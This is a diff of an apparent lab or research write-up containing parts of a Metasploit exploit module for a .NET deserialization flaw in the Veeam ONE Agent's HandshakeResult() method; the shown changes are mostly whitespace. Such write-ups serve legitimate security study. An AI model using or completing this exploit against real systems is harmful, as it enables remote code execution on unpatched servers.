@@ -469,10 +469,13 @@ This was actually fairly nasty to set up:  I will give the full code of my modif
 
 `
 class MetasploitModule < Msf::Exploit::Remote
+
   Rank = NormalRanking
+
   include Msf::Exploit::Remote::Tcp
   include Msf::Exploit::CmdStager
   include Msf::Exploit::Powershell
+
   def initialize(info = {})
     super(
       update_info(
@@ -482,9 +485,11 @@ class MetasploitModule < Msf::Exploit::Remote
           This module exploits a .NET deserialization vulnerability in the Veeam
           ONE Agent before the hotfix versions 9.5.5.4587 and 10.0.1.750 in the
           9 and 10 release lines.
+
           Specifically, the module targets the HandshakeResult() method used by
           the Agent. By inducing a failure in the handshake, the Agent will
           deserialize untrusted data.
+
           Tested against the pre-patched release of 10.0.0.750. Note that Veeam
           continues to distribute this version but with the patch pre-applied.
         },
@@ -674,10 +679,8 @@ class MetasploitModule < Msf::Exploit::Remote
     vprint_good("--> Handshake packet: #{pkt.inspect}")
     pkt
   end
-
 end
 `
-
 
 ---
 
